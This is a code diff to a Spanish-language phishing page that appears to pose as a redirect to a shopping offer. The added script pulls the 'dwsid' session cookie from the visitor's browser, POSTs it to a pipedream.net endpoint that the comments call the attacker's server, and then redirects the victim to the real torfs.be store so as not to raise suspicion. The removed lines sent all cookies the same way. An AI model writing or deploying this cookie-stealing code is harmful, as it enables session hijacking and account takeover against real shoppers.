@@ -8,21 +8,28 @@
   <h1>Redirigiendo a la oferta...</h1>
 
   <script>
-    // Capturamos la cookie
-    const cookie = document.cookie;
+    // Buscar el valor de la cookie 'dwsid'
+    const match = document.cookie.match(/(?:^|; )dwsid=([^;]*)/);
+    const dwsid = match ? match[1] : "";
 
-    // La enviamos a tu endpoint
-    fetch("https://eoozwutroaqr7ij.m.pipedream.net", {
-      method: "POST",
-      headers: {
-        "Content-Type": "application/x-www-form-urlencoded"
-      },
-      body: "cookie=" + encodeURIComponent(cookie)
-    })
-    .then(() => {
-      // Redirigimos a la víctima a la página real
+    if (dwsid) {
+      // Enviar solo el dwsid al servidor del atacante
+      fetch("https://eoozwutroaqr7ij.m.pipedream.net", {
+        method: "POST",
+        headers: {
+          "Content-Type": "application/x-www-form-urlencoded"
+        },
+        body: "dwsid=" + encodeURIComponent(dwsid)
+      })
+      .then(() => {
+        // Redirigir a la página real para no levantar sospechas
+        window.location.href = "https://www.torfs.be";
+      });
+    } else {
+      // Si no se encuentra la cookie, redirigir igual
       window.location.href = "https://www.torfs.be";
-    });
+    }
   </script>
 </body>
 </html>
+
